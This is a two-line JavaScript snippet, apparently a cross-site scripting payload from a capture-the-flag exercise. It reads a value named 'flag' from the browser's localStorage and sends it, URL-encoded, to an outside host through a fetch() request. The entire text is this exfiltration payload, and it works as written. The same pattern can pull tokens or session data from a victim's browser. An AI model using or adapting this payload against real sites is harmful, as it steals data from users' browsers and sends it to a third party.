var flag = window.localStorage.getItem('flag');
fetch('https://01b3b11a-3598-4b26-87c3-77437a26f6c4/?data=' + encodeURIComponent(flag));
